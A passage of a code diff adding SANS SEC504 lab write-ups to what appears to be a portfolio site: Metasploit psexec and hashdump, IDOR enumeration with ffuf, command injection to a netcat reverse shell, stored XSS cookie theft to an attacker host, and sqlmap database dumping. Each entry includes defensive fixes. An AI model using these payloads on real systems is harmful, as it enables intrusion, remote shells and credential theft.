+      { src: "/labs/metasploit-205613.png", alt: "search psexec", caption: "psexec module family: smb_relay, ms17_010, plain smb/psexec" },
+      { src: "/labs/metasploit-205806.png", alt: "module info", caption: "smb/psexec: Privileged Yes, authenticated user code execution" },
+      { src: "/labs/metasploit-205918.png", alt: "select module + payload", caption: "use exploit/windows/smb/psexec; default meterpreter/reverse_tcp" },
+      { src: "/labs/metasploit-210313.png", alt: "configure and exploit", caption: "RHOSTS/SMBUser/SMBPass/LHOST set; session opens" },
+      { src: "/labs/metasploit-210458.png", alt: "SYSTEM session", caption: "sessions: NT AUTHORITY\\SYSTEM @ SEC504STUDENT" },
+      { src: "/labs/metasploit-210628.png", alt: "systeminfo", caption: "Full host detail via execute -if systeminfo" },
+      { src: "/labs/metasploit-210642.png", alt: "getuid", caption: "Server username: NT AUTHORITY\\SYSTEM" },
+      { src: "/labs/metasploit-210728.png", alt: "process list", caption: "ps: PID/PPID/user/path for choosing a migration target" },
+      { src: "/labs/metasploit-210938.png", alt: "migrate to lsass", caption: "migrate -N lsass.exe; session becomes x64/windows" },
+      { src: "/labs/metasploit-211023.png", alt: "hashdump", caption: "Local SAM NTLM hashes incl. empty-password 31d6cfe0..." },
+    ],
+  },
+  {
+    id: 33,
+    courseSlug: "sec504",
+    slug: "idor-forced-browsing",
+    title: "IDOR and Forced Browsing: Enumerating Objects Nobody Should Reach",
+    course: "SEC504 - Hacker Tools, Techniques, and Incident Handling",
+    role: "Solo, Lab",
+    focus: "Web Application Security",
+    level: "SEC504",
+    date: "Jul 2026",
+    artifacts: "Sanitized ffuf, curl, and browser output from the SEC504 web lab against support.falsimentis.com",
+    context:
+      "This lab chains forced browsing (content discovery with ffuf) into an insecure direct object reference: a chatbot saves conversation logs to predictable, sequentially numbered files with no authentication, so enumerating the IDs exposes every user's transcript. It is a clean demonstration of two of the most common web findings, and how one feeds the other.",
+    summary:
+      "Started with robots.txt, which named /admin and /singlestatus as disallowed (a map of what to look at, not a control). ffuf with a large wordlist discovered admin, chat, contact, kb, status, and a builds path that returned a directory listing exposing a full Docker build log (installed packages, base image, build stages). The chatbot at /chat saved transcripts on the 'save' command to /chatlogs/chatlog-<id>.txt with a predictable four-digit ID and no auth. Enumerating IDs with seq piped into ffuf, filtering out the baseline 500 error (-fc 500), found live logs at 2305, 5492, 7127, 7341, and 9653, each another user's full conversation, in 10,000 requests over five seconds.",
+    whyThisMatters:
+      "IDOR is consistently near the top of real-world web findings because it needs no exploit, just a predictable identifier and a missing authorization check. Here a four-digit sequential ID plus no ownership check meant 10,000 requests, five seconds, and every user's chat log. This is the exact class of bug I hunt for in AppSec reviews: the object reference is right there in the URL, and the only thing standing between a user and someone else's data is a server-side check the developer forgot to write.",
+    tldr: [
+      "ffuf content discovery found a /builds directory listing leaking a full Docker build log",
+      "A chatbot saved transcripts to predictable /chatlogs/chatlog-<id>.txt files with no authorization check",
+      "seq + ffuf -fc 500 enumerated 10,000 IDs in five seconds and pulled every user's chat log (IDOR)",
+    ],
+    skillsDemonstrated: [
+      "Forced browsing / content discovery with ffuf",
+      "Reading robots.txt as an attack map",
+      "Directory-listing and build-artifact analysis",
+      "IDOR identification and object enumeration",
+      "Response-code filtering to separate hits from noise (-fc)",
+    ],
+    tools: ["ffuf 2.1.0", "curl", "seq", "Firefox", "Slingshot Linux"],
+    steps: [
+      "Read robots.txt for disallowed paths",
+      "Discover content with ffuf and a large wordlist",
+      "Investigate the builds directory listing and build log",
+      "Trigger the chatbot's save function and find the log file",
+      "Enumerate log IDs with seq + ffuf, filtering the baseline error",
+      "Retrieve another user's chat log to confirm the IDOR",
+    ],
+    stepDetails: [
+      {
+        title: "Read robots.txt",
+        description:
+          "curl on robots.txt showed AI-crawler blocks and, for all agents, Disallow: /admin and Disallow: /singlestatus. robots.txt does not protect anything; it is a list of the paths the site most wants hidden, which makes it the first place to look.",
+        command: "curl http://support.falsimentis.com/robots.txt",
+        commandBreakdown: "Disallow entries are a map of sensitive paths, not access control",
+        screenshot: "/labs/idor-135313.png",
+      },
+      {
+        title: "Discover content with ffuf",
+        description:
+          "ffuf fuzzed the URL path with a 128k-word list at ~2,200 requests/sec. Hits: admin, chat, contact, kb, status (all 200), and builds (302). The FUZZ keyword marks where each wordlist entry is substituted.",
+        command: "ffuf -w combined_words.txt -u http://support.falsimentis.com/FUZZ",
+        commandBreakdown: "FUZZ: injection point\nDefault status matcher catches 200/301/302/401/403",
+        screenshot: "/labs/idor-141203.png",
+      },
+      {
+        title: "Investigate the builds directory listing",
+        description:
+          "curl -v on /builds/ returned an 'Index of /builds' directory listing exposing build.log (80 KB) and build.log.old. Reading build.log leaked the entire Docker build: python:3.7-slim base, installed packages (including fping and netcat, relevant to the sibling command-injection lab), and every build stage.",
+        command: "curl -v http://support.falsimentis.com/builds/\ncurl -v http://support.falsimentis.com/builds/build.log",
+        commandBreakdown: "Directory listing + build log leak internal implementation detail",
+        screenshot: "/labs/idor-141654.png",
+      },
+      {
+        title: "Trigger the chatbot save",
+        description:
+          "The /chat bot offered a 'save' command. Typing save returned 'Chat history saved!' and wrote the transcript to /chatlogs/chatlog-7341.txt. curling that file returned the transcript: a predictable four-digit ID, served with no authentication.",
+        command: "# in the chat UI: type 'save'\ncurl http://support.falsimentis.com/chatlogs/chatlog-7341.txt",
+        commandBreakdown: "Predictable 4-digit ID + no auth = the IDOR precondition",
+        screenshot: "/labs/idor-142327.png",
+      },
+      {
+        title: "Enumerate the log IDs",
+        description:
+          "seq generated IDs piped into ffuf as a stdin wordlist. The first pass showed every nonexistent ID returned 500, so -fc 500 filtered that baseline out. Sweeping 0-9999 found live logs at 2305, 5492, 7127, 7341, and 9653 in 10,000 requests over five seconds.",
+        command: "seq -w 0 9999 | ffuf -w - -u http://support.falsimentis.com/chatlogs/chatlog-FUZZ.txt -fc 500",
+        commandBreakdown: "-w -: read wordlist from stdin\n-fc 500: filter the baseline error code",
+        screenshot: "/labs/idor-142817.png",
+      },
+      {
+        title: "Retrieve another user's log",
+        description:
+          "curling chatlog-2305.txt returned a complete conversation belonging to a different user. No credentials, no session, no ownership check: a predictable ID was the only thing between an anonymous request and another user's data. That is IDOR.",
+        command: "curl http://support.falsimentis.com/chatlogs/chatlog-2305.txt",
+        commandBreakdown: "Direct object reference with no server-side authorization",
+        screenshot: "/labs/idor-142924.png",
+      },
+    ],
+    outcome:
+      "Chained forced browsing into an IDOR: ffuf discovered a directory listing leaking a Docker build log, and the chatbot's predictable, unauthenticated log filenames let a 10,000-request sweep pull every user's transcript in five seconds. Two of the most common web findings, one feeding the other.",
+    nextStepsInProduction:
+      "Add a server-side authorization check on every object access so a user can only retrieve logs they own, and replace sequential IDs with unguessable identifiers (UUIDs) as defense in depth. Disable directory listing and move build artifacts out of the web root. Rate-limit and alert on high-volume 404/500 sweeps against a single path, which is the enumeration signature. Do not rely on robots.txt for anything but crawler hints.",
+    securityControlsRelevant: [
+      "Server-side authorization on every direct object reference",
+      "Unguessable identifiers (UUIDs) instead of sequential IDs",
+      "Directory-listing disabled; artifacts out of web root",
+      "Rate limiting and enumeration detection",
+      "Not treating robots.txt as access control",
+    ],
+    keyFindings: [
+      "robots.txt disclosed /admin and /singlestatus as sensitive paths",
+      "/builds directory listing leaked a full Docker build log",
+      "Chatbot saved transcripts to predictable /chatlogs/chatlog-<id>.txt with no auth",
+      "seq + ffuf -fc 500 enumerated 10,000 IDs in 5 seconds, exposing 5 users' logs",
+    ],
+    takeaway: [
+      "IDOR is the finding I look for first in a review because it is common, high-impact, and needs no exploit. The whole vulnerability is a reference in the URL plus a missing check on the server. Here the reference was a four-digit number and the missing check was ownership, so anyone could read anyone's chat log. The fix is one authorization check per object access, and the fact that it is so often skipped is exactly why IDOR keeps topping the findings lists.",
+      "The enumeration technique is worth keeping. seq feeding ffuf on stdin, with -fc filtering the baseline error, turns 'is this ID valid?' into a five-second sweep of ten thousand possibilities. Sequential identifiers make it trivial; unguessable IDs make it impractical. That single design choice, UUID versus auto-increment, is the difference between a bug that is instantly enumerable and one that is not, which is why it belongs in the threat model of any object-reference endpoint.",
+    ],
+    screenshots: [
+      { src: "/labs/idor-135313.png", alt: "robots.txt", caption: "robots.txt discloses /admin and /singlestatus" },
+      { src: "/labs/idor-135819.png", alt: "wordlists", caption: "Forced-browsing wordlists in ~/labs/forcedbrowsing" },
+      { src: "/labs/idor-140221.png", alt: "ffuf wellknown", caption: "First ffuf pass with the small wordlist" },
+      { src: "/labs/idor-141203.png", alt: "ffuf content discovery", caption: "ffuf finds admin, chat, contact, kb, status, builds" },
+      { src: "/labs/idor-141414.png", alt: "builds directory listing", caption: "'Index of /builds' exposes build.log and build.log.old" },
+      { src: "/labs/idor-141654.png", alt: "Docker build log", caption: "build.log leaks base image, packages (fping, netcat), build stages" },
+      { src: "/labs/idor-142315.png", alt: "chatbot save", caption: "The /chat bot saves transcripts on the 'save' command" },
+      { src: "/labs/idor-142327.png", alt: "own chat log", caption: "chatlog-7341.txt: predictable 4-digit ID, no auth" },
+      { src: "/labs/idor-142710.png", alt: "baseline filter", caption: "Nonexistent IDs return 500; -fc 500 filters the noise" },
+      { src: "/labs/idor-142817.png", alt: "ID enumeration", caption: "seq + ffuf sweeps 0-9999: hits at 2305, 5492, 7127, 7341, 9653" },
+      { src: "/labs/idor-142924.png", alt: "another user's log", caption: "chatlog-2305.txt returns a different user's full transcript (IDOR)" },
+    ],
+  },
+  {
+    id: 34,
+    courseSlug: "sec504",
+    slug: "os-command-injection-reverse-shell",
+    title: "OS Command Injection to Reverse Shell",
+    course: "SEC504 - Hacker Tools, Techniques, and Incident Handling",
+    role: "Solo, Lab",
+    focus: "Web Application Security",
+    level: "SEC504",
+    date: "Jul 2026",
+    artifacts: "Sanitized browser and netcat output from the SEC504 web lab against support.falsimentis.com/singlestatus",
+    context:
+      "This lab exploits a server-test page that passes user input into an fping command line without sanitization. It works the injection methodically: prove the sink with harmless argument injection first, then escalate to command injection with a failure operator, enumerate, and finish with a reverse shell running as root. The disciplined progression (argument injection before shell metacharacters) is the part worth learning.",
+    summary:
+      "The /singlestatus?target= page runs fping against a user-supplied target. Submitting -h returned fping's usage text, proving input reaches the command line (argument injection) before touching any shell metacharacter. A colon payload failed (wrong operator), but -z || id worked: the invalid -z option forces fping to fail, and || then runs id, returning uid=0(root). From there, -z || ls exposed the application source (app.py, db.sqlite3, config.py), -z || which nc confirmed netcat was installed, and -z || nc 10.10.75.1 4444 -e /bin/sh opened a reverse shell as root. Inside the shell, sqlite3 db.sqlite3 .dump exfiltrated the full database.",
+    whyThisMatters:
+      "Command injection is a direct path from a web input to code execution as whatever user the web process runs as, root here, which is total server compromise. The methodology is the lesson: testing -h first proves the vulnerability with a single harmless request, and choosing || (run on failure) instead of ; or && is more reliable when you can force the base command to fail. This is exactly how I approach an injection sink in a review, confirm the reach before proving impact.",
+    tldr: [
+      "Argument injection (-h returns fping usage) proved the input reached the command line with one harmless request",
+      "-z || id executed as root: the invalid option forces failure, then || runs the injected command",
+      "Chained to a reverse shell as root and exfiltrated the SQLite database with .dump",
+    ],
+    skillsDemonstrated: [
+      "Argument injection as a low-impact confirmation probe",
+      "OS command injection via shell operators",
+      "Choosing || (on-failure) for reliable injection",
+      "Reverse shell establishment with netcat",
+      "Post-exploitation data exfiltration (sqlite3 .dump)",
+    ],
+    tools: ["curl / browser", "fping", "netcat", "sqlite3", "Slingshot Linux"],
+    steps: [
+      "Read robots.txt and find the /singlestatus endpoint",
+      "Submit a normal target and observe the fping output",
+      "Probe with -h (argument injection) to prove the sink",
+      "Escalate to command injection with -z || id",
+      "Enumerate the app directory and check for netcat",
+      "Open a reverse shell and exfiltrate the database",
+    ],
+    stepDetails: [
+      {
+        title: "Find and exercise the endpoint",
+        description:
+          "robots.txt pointed at /singlestatus. The page (For Official Use Only) takes a target and returns fping output (packet counts, min/avg/max). Normal input produces normal output; the question is whether that input reaches a shell.",
+        command: "curl http://support.falsimentis.com/robots.txt\n# browse /singlestatus?target=10.10.75.1",
+        commandBreakdown: "The page runs fping against the target parameter",
+        screenshot: "/labs/command-injection-145134.png",
+      },
+      {
+        title: "Prove the sink with argument injection",
+        description:
+          "Before any shell metacharacter, submitting target=-h returned fping's full usage text. That single harmless response proves user input is placed on the fping command line unsanitized. Argument injection confirms the vulnerability without risking anything.",
+        command: "# /singlestatus?target=-h",
+        commandBreakdown: "-h is interpreted as an fping flag: input reaches the command line",
+        screenshot: "/labs/command-injection-145217.png",
+      },
+      {
+        title: "Escalate to command injection",
+        description:
+          "A colon payload failed (not a shell separator here). The working payload was -z || id: the invalid -z option makes fping exit non-zero, and || then runs id, which returned uid=0(root) gid=0(root). Forcing the base command to fail makes || fire reliably.",
+        command: "# /singlestatus?target=-z || id",
+        commandBreakdown: "Invalid -z forces failure; || runs id -> uid=0(root)",
+        screenshot: "/labs/command-injection-145512.png",
+      },
+      {
+        title: "Enumerate the application",
+        description:
+          "-z || ls listed the app directory: app.py, db.sqlite3, config.py, templates, trainbot.py, and more. -z || which nc confirmed /usr/bin/nc (netcat was installed, which the sibling IDOR lab's build.log had already revealed).",
+        command: "# /singlestatus?target=-z || ls\n# /singlestatus?target=-z || which nc",
+        commandBreakdown: "Enumerate the source and confirm a tool for the next step",
+        screenshot: "/labs/command-injection-145539.png",
+      },
+      {
+        title: "Open a reverse shell as root",
+        description:
+          "With netcat present, a listener on the attacker (nc -l -v -p 4444) plus the payload -z || nc 10.10.75.1 4444 -e /bin/sh produced a connection from support.falsimentis.com running as root. A web input became an interactive root shell.",
+        command: "# attacker: nc -l -v -p 4444\n# /singlestatus?target=-z || nc 10.10.75.1 4444 -e /bin/sh",
+        commandBreakdown: "-e /bin/sh binds the shell; connection runs as the web process user (root)",
+        screenshot: "/labs/command-injection-145829.png",
+      },
+      {
+        title: "Exfiltrate the database",
+        description:
+          "In the root shell, sqlite3 db.sqlite3 .dump printed the full schema and data (the chatbot's tag and statement tables, its training corpus). Command injection to root is complete server compromise, and the local database is right there.",
+        command: "sqlite3 db.sqlite3 \".dump\"",
+        commandBreakdown: ".dump: full schema + data export",
+        screenshot: "/labs/command-injection-150006.png",
+      },
+    ],
+    outcome:
+      "Turned an unsanitized fping parameter into a root reverse shell by confirming the sink with argument injection (-h), escalating with the -z || failure-operator technique, and exfiltrating the SQLite database. A single web input became complete server compromise as root.",
+    nextStepsInProduction:
+      "Never pass user input to a shell: use a library or a direct syscall (an ICMP library instead of shelling out to fping), and if a command must be built, use an argument array with no shell interpretation and a strict allowlist for the target (validate it is an IP or hostname). Run the web process as an unprivileged user, not root, so injection does not immediately mean full compromise. Add a WAF rule and alerting for shell metacharacters in the target parameter.",
+    securityControlsRelevant: [
+      "No shell invocation on user input (library calls / argv arrays)",
+      "Strict input validation (allowlist IP/hostname)",
+      "Least-privilege web process (not root)",
+      "WAF rules for shell metacharacters",
+      "Egress filtering to block reverse-shell callbacks",
+    ],
+    keyFindings: [
+      "Argument injection (-h) proved the sink with one harmless request",
+      "-z || id executed as root (uid=0)",
+      "The web process ran as root, so injection meant full compromise",
+      "Reverse shell + sqlite3 .dump exfiltrated the entire database",
+    ],
+    takeaway: [
+      "The methodology is the takeaway: prove reach before proving impact. Submitting -h and getting fping's usage back is a harmless request that conclusively demonstrates the input hits the command line. Only then does it make sense to reach for shell operators. In a review, that ordering keeps you from firing destructive payloads to answer a question a benign one already settles.",
+      "|| is the reliable operator when you can force the base command to fail. ; always runs the second command and && only runs it on success, but || runs it precisely when the first command errors, and an invalid flag like -z guarantees that error. Combined with a web process running as root, the result is that one carefully chosen query string yields an interactive root shell. Running the web app unprivileged would not fix the injection, but it would turn a catastrophe into a contained one.",
+    ],
+    screenshots: [
+      { src: "/labs/command-injection-145029.png", alt: "robots.txt", caption: "robots.txt points at /singlestatus" },
+      { src: "/labs/command-injection-145134.png", alt: "normal fping output", caption: "Normal target returns fping packet statistics" },
+      { src: "/labs/command-injection-145217.png", alt: "argument injection -h", caption: "target=-h returns fping usage: input reaches the command line" },
+      { src: "/labs/command-injection-145314.png", alt: "colon payload fails", caption: "A colon is not a shell separator here (name resolution error)" },
+      { src: "/labs/command-injection-145512.png", alt: "command injection id", caption: "-z || id returns uid=0(root) gid=0(root)" },
+      { src: "/labs/command-injection-145539.png", alt: "enumerate with ls", caption: "-z || ls lists app.py, db.sqlite3, config.py, templates" },
+      { src: "/labs/command-injection-145618.png", alt: "which nc", caption: "-z || which nc confirms /usr/bin/nc" },
+      { src: "/labs/command-injection-145743.png", alt: "reverse shell payload", caption: "Payload: -z || nc 10.10.75.1 4444 -e /bin/sh" },
+      { src: "/labs/command-injection-145829.png", alt: "root reverse shell", caption: "Connection from support.falsimentis.com; ls runs as root" },
+      { src: "/labs/command-injection-150006.png", alt: "sqlite dump", caption: "sqlite3 db.sqlite3 .dump exfiltrates the full database" },
+    ],
+  },
+  {
+    id: 35,
+    courseSlug: "sec504",
+    slug: "stored-xss-session-hijacking",
+    title: "Stored XSS to Session Hijacking",
+    course: "SEC504 - Hacker Tools, Techniques, and Incident Handling",
+    role: "Solo, Lab",
+    focus: "Web Application Security",
+    level: "SEC504",
+    date: "Jul 2026",
+    artifacts: "Sanitized browser, PHP cookie-catcher, and admin-panel output from the SEC504 web lab against support.falsimentis.com",
+    context:
+      "This lab finds a stored cross-site scripting flaw in a support-ticket form, weaponizes it into a cookie stealer, and uses the stolen session token to reach an admin panel. The instructive part is the per-field testing: the same form escapes one field and not another, so the vulnerability is only found by probing every input, and the real impact is a second victim, not an alert box.",
+    summary:
+      "The /contact form echoes submitted fields back on a confirmation page. Probing each field with a harmless <hr> tag showed the name field was escaped (rendered as text) but the email field was not (rendered an actual horizontal rule). A <script>alert(1)</script> in the email field executed, confirming XSS. Standing up a PHP cookie-catcher (file_put_contents logging GET/headers) and injecting <script>document.location=\"http://10.10.75.1:8080/?\"+document.cookie</script>, the log recorded two hits: the tester's own browser and, minutes later, a different internal IP (the SME analyst who opened the ticket), confirming this was stored XSS. Replaying that stolen authtoken with curl -b reached the admin panel, whose ticket queue exposed users typing their own passwords into support requests.",
+    whyThisMatters:
+      "The impact of XSS is not the alert box; it is the second IP in the cookie log, an analyst whose session was hijacked just by viewing a ticket. Stored XSS is especially dangerous because it fires against whoever opens the record, including staff with more privilege than the attacker. The per-field lesson is one I apply directly in reviews: output encoding is applied inconsistently far more often than it is applied nowhere, so every field must be tested, not just the obvious one.",
+    tldr: [
+      "Per-field probing with <hr> found the email field unescaped while the name field was correctly encoded",
+      "A cookie-stealer payload logged a second victim (the SME analyst), confirming stored XSS",
+      "Replaying the stolen authtoken with curl -b reached the admin panel and its ticket queue",
+    ],
+    skillsDemonstrated: [
+      "Per-field XSS probing with harmless markup (<hr>)",
+      "Distinguishing escaped vs unescaped output",
+      "Stored XSS weaponization (cookie theft)",
+      "Session hijacking via stolen token replay",
+      "Impact demonstration through privilege gain",
+    ],
+    tools: ["curl / browser", "PHP built-in server", "Slingshot Linux"],
+    steps: [
+      "Submit the contact form and see which fields are echoed",
+      "Probe each field with <hr> to find inconsistent encoding",
+      "Confirm script execution in the vulnerable field",
+      "Stand up a PHP cookie-catcher",
+      "Inject a cookie-stealing payload and watch the log",
+      "Replay the stolen token to reach the admin panel",
+    ],
+    stepDetails: [
+      {
+        title: "Map the reflected fields",
+        description:
+          "The /contact form (name, email, company, file, message) echoes its values on a 'Thanks' confirmation page. Any echoed field is a candidate sink for XSS, so the first step is just to see what comes back.",
+        command: "# submit /contact with test values and read the confirmation",
+        commandBreakdown: "Echoed fields are the XSS candidates to probe",
+        screenshot: "/labs/xss-102345.png",
+      },
+      {
+        title: "Probe each field with <hr>",
+        description:
+          "Submitting Lorezo<hr> in the name field rendered the literal text (escaped, safe). The same <hr> in the email field rendered an actual horizontal rule (unescaped, injectable). Same form, same page, different encoding per field: this is why every input must be tested.",
+        command: "# name: Lorezo<hr>  -> rendered as text (escaped)\n# email: lorenzo@gmail.com<hr>  -> rendered as a rule (injectable)",
+        commandBreakdown: "<hr> is a harmless, unmistakable probe: rule = injectable",
+        screenshot: "/labs/xss-102401.png",
+      },
+      {
+        title: "Confirm script execution",
+        description:
+          "With the email field confirmed injectable, lorenzo@gmail.com<script>alert(1)</script> produced an alert box from support.falsimentis.com. XSS confirmed; now to weaponize it into something with real impact.",
+        command: "# email: lorenzo@gmail.com<script>alert(1)</script>",
+        commandBreakdown: "alert(1) executing proves script injection, not just HTML injection",
+        screenshot: "/labs/xss-103302.png",
+      },
+      {
+        title: "Stand up a cookie-catcher",
+        description:
+          "A small PHP script logged incoming GET parameters and headers to cookies.log, served with the PHP built-in server on 8080. This is the endpoint the injected script will send victims' cookies to.",
+        command: "cat index.php  # file_put_contents(\"cookies.log\", ...GET...headers...)\nphp -S 0.0.0.0:8080",
+        commandBreakdown: "php -S serves the catcher; it appends every request to cookies.log",
+        screenshot: "/labs/xss-103736.png",
+      },
+      {
+        title: "Inject the cookie stealer and catch a second victim",
+        description:
+          "The payload redirected the victim's browser to the catcher with their cookie appended: <script>document.location=\"http://10.10.75.1:8080/?\"+document.cookie</script>. The log showed two hits: the tester's own browser, and minutes later a different internal IP (172.30.0.201), the SME analyst who opened the ticket. That second IP is what makes this stored XSS.",
+        command: "# email field payload:\n# <script>document.location=\"http://10.10.75.1:8080/?\"+document.cookie</script>",
+        commandBreakdown: "The analyst's browser fires the payload on viewing the ticket",
+        screenshot: "/labs/xss-104147.png",
+      },
+      {
+        title: "Hijack the session",
+        description:
+          "The admin panel was a troll page when unauthenticated, but curl with the stolen authtoken cookie (-b) returned the real admin interface: a ticket queue where users had typed their own usernames and passwords into support requests. The stolen session became privileged access.",
+        command: "curl http://support.falsimentis.com/admin/\ncurl http://support.falsimentis.com/admin/ -b authtoken=77ba9cd915c8e359d9733edcfe9c61e5aca92afb",
+        commandBreakdown: "-b sends the stolen cookie; the panel now authorizes the request",
+        screenshot: "/labs/xss-104600.png",
+      },
+    ],
+    outcome:
+      "Found a stored XSS in a support-ticket form through per-field probing, weaponized it into a cookie stealer that captured an SME analyst's session, and replayed that token to reach an admin panel exposing credentials users had typed into tickets. The impact was a hijacked staff session, not an alert box.",
+    nextStepsInProduction:
+      "Apply context-aware output encoding on every field, not selectively, and add a Content-Security-Policy that blocks inline script and external exfiltration destinations. Set session cookies HttpOnly so document.cookie cannot read them, and SameSite/Secure to limit replay. Train users and templates so passwords are never entered into ticket bodies, and scan ticket content for credential patterns. Test every input for XSS in QA, since the flaw here was inconsistent, not absent, encoding.",
+    securityControlsRelevant: [
+      "Consistent context-aware output encoding on all fields",
+      "Content-Security-Policy blocking inline script and exfil hosts",
+      "HttpOnly / SameSite / Secure session cookies",
+      "Credential-pattern scanning of user-submitted content",
+      "XSS test coverage across every input in QA",
+    ],
+    keyFindings: [
+      "The name field was escaped but the email field was not (inconsistent encoding)",
+      "<script>alert(1)</script> executed in the email field",
+      "The cookie log caught a second internal IP: the SME analyst (stored XSS)",
+      "The stolen authtoken replayed via curl -b reached the admin panel",
+      "The admin ticket queue exposed users' plaintext passwords",
+    ],
+    takeaway: [
+      "The real impact of XSS is the second IP in the log. An alert box proves execution but persuades no one; a captured analyst session, fired simply because staff opened a ticket, shows what stored XSS actually does. It reaches anyone who views the record, and in a support tool that means employees with more access than the attacker started with. Framing the finding around the hijacked session, not the popup, is what makes it land.",
+      "Encoding is usually inconsistent, not absent, and that is the trap. The same form escaped the name field and forgot the email field, so testing only the obvious input would have missed the bug entirely. In a review, every reflected or stored field is its own test case, because a single forgotten sink is all stored XSS needs. HttpOnly cookies and a strict CSP would have neutralized the weaponization even with the injection present, which is why defense in depth matters here.",
+    ],
+    screenshots: [
+      { src: "/labs/xss-102334.png", alt: "contact form", caption: "The /contact support form with five fields" },
+      { src: "/labs/xss-102345.png", alt: "confirmation echo", caption: "Submitted fields are echoed on the 'Thanks' page" },
+      { src: "/labs/xss-102401.png", alt: "hr probe in name", caption: "Name field: Lorezo<hr> renders as text (escaped)" },
+      { src: "/labs/xss-102949.png", alt: "hr in email field", caption: "Email field accepts the <hr> tag" },
+      { src: "/labs/xss-103000.png", alt: "hr rendered", caption: "Email field renders an actual rule: unescaped, injectable" },
+      { src: "/labs/xss-103252.png", alt: "script payload", caption: "Injecting <script>alert(1)</script> in the email field" },
+      { src: "/labs/xss-103302.png", alt: "alert fires", caption: "alert(1) from support.falsimentis.com confirms XSS" },
+      { src: "/labs/xss-103736.png", alt: "cookie-catcher", caption: "PHP cookie-catcher served on :8080" },
+      { src: "/labs/xss-103914.png", alt: "cookie-steal payload", caption: "Payload redirects to the catcher with document.cookie" },
+      { src: "/labs/xss-104147.png", alt: "two victims in log", caption: "Log shows the tester and a second IP: the SME analyst (stored XSS)" },
+      { src: "/labs/xss-104357.png", alt: "admin unauthenticated", caption: "Admin panel is a troll page without a valid token" },
+      { src: "/labs/xss-104600.png", alt: "admin with stolen token", caption: "curl -b with the stolen authtoken returns the real admin panel" },
+      { src: "/labs/xss-104646.png", alt: "credentials in tickets", caption: "Ticket queue exposes users' plaintext passwords" },
+    ],
+  },
+  {
+    id: 36,
+    courseSlug: "sec504",
+    slug: "sql-injection-database-exfiltration-sqlmap",
+    title: "SQL Injection and Database Exfiltration with sqlmap",
+    course: "SEC504 - Hacker Tools, Techniques, and Incident Handling",
+    role: "Solo, Lab",
+    focus: "Web Application Security",
+    level: "SEC504",
+    date: "Jul 2026",
+    artifacts: "Sanitized manual probe and sqlmap output from the SEC504 web lab against support.falsimentis.com/kb",
+    context:
+      "This lab confirms a SQL injection by hand with a single quote, then uses sqlmap to characterize it and walk the enumeration ladder from databases to tables to a full table dump. It also shows sqlmap distinguishing an injectable parameter from a non-injectable one on the same URL, and cracking recovered password hashes inline.",
+    summary:
+      "The /kb documentation search takes entityid and search parameters. Appending a single quote to search returned a MariaDB 1064 syntax error, confirming injection by hand before any tool. sqlmap then tested both parameters, found entityid not injectable and search injectable via four techniques (boolean-blind, error-based, time-based, and a 3-column UNION), and identified the backend as MySQL/MariaDB. Walking the ladder: --dbs listed information_schema and support; -D support --tables listed chat, contact, kb, tickets, users; and -D support -T users --dump pulled 12 users with roles (sme, admin, audit) and password hashes, one of which sqlmap cracked inline to Password123.",
+    whyThisMatters:
+      "SQL injection remains one of the highest-impact web findings because it exposes the entire database, credentials, roles, everything, and here a single quote in a search box was enough to confirm it. The detail that matters for reviews is that only one of two parameters was injectable: sqlmap tested both and told me which, which is why parameter-level testing beats assuming the whole endpoint is safe or unsafe. Parameterized queries would have closed this completely.",
+    tldr: [
+      "A single quote in the search box returned a MariaDB 1064 error, confirming SQLi by hand",
+      "sqlmap found only 'search' injectable (not 'entityid') via four techniques and enumerated the database",
+      "--dump pulled 12 users with roles and password hashes; sqlmap cracked one inline to Password123",
+    ],
+    skillsDemonstrated: [
+      "Manual SQL injection confirmation (error-based)",
+      "Automated exploitation with sqlmap",
+      "Parameter-level injectability testing",
+      "Database enumeration ladder (--dbs, --tables, --dump)",
+      "Inline hash cracking of dumped credentials",
+    ],
+    tools: ["sqlmap 1.5.2", "curl / browser", "Slingshot Linux"],
+    steps: [
+      "Confirm the injection by hand with a single quote",
+      "Run sqlmap against the URL and characterize the injection",
+      "Enumerate databases with --dbs",
+      "Enumerate tables in the target database",
+      "Dump the users table and read the roles and hashes",
+    ],
+    stepDetails: [
+      {
+        title: "Confirm by hand",
+        description:
+          "Appending a single quote to the search parameter (search=RAG') returned '1064, You have an error in your SQL syntax ... MariaDB' directly on the page. A one-character manual probe confirms the injection before sqlmap is ever launched, and tells you the backend is MySQL/MariaDB.",
+        command: "# /kb?entityid=3487&search=RAG'",
+        commandBreakdown: "A single quote breaks the query -> 1064 syntax error = confirmed SQLi",
+        screenshot: "/labs/sql-injection-120418.png",
+      },
+      {
+        title: "Characterize with sqlmap",
+        description:
+          "sqlmap tested both parameters. entityid was not injectable; search was, via boolean-based blind, error-based (FLOOR/EXTRACTVALUE), time-based blind (SLEEP), and a 3-column UNION query. It confirmed the backend as MySQL >= 5.0 (MariaDB fork) and stored the session so later runs resume instantly.",
+        command: "sqlmap -u \"http://support.falsimentis.com/kb?entityid=3487&search=RAG\"",
+        commandBreakdown: "sqlmap tests each parameter and reports which is injectable and how",
+        screenshot: "/labs/sql-injection-120819.png",
+      },
+      {
+        title: "Enumerate databases",
+        description:
+          "--dbs listed the available databases: information_schema (always present) and support (the application's). This is the top rung of the enumeration ladder.",
+        command: "sqlmap -u \"...\" --dbs",
+        commandBreakdown: "--dbs: list databases; support is the app's",
+        screenshot: "/labs/sql-injection-121236.png",
+      },
+      {
+        title: "Enumerate tables",
+        description:
+          "-D support --tables listed chat, contact, kb, tickets, and users. The users table is the obvious next target for credential recovery.",
+        command: "sqlmap -u \"...\" -D support --tables",
+        commandBreakdown: "-D <db> --tables: list tables in the chosen database",
+        screenshot: "/labs/sql-injection-121356.png",
+      },
+      {
+        title: "Dump the users table",
+        description:
+          "-D support -T users --dump recovered 12 users with names, emails, usernames, roles (sme, admin, audit), and password hashes. sqlmap recognized the password column as hashes and cracked one inline, annotating it (Password123). Full credential and role disclosure from a single quote in a search box.",
+        command: "sqlmap -u \"...\" -D support -T users --dump",
+        commandBreakdown: "--dump: extract the table; sqlmap offers to crack recognized hashes",
+        screenshot: "/labs/sql-injection-121638.png",
+      },
+    ],
+    outcome:
+      "Confirmed a SQL injection by hand with a single quote, then used sqlmap to identify the one injectable parameter, enumerate the database, and dump 12 users with roles and password hashes, one of which cracked inline to Password123. A search box became full database and credential disclosure.",
+    nextStepsInProduction:
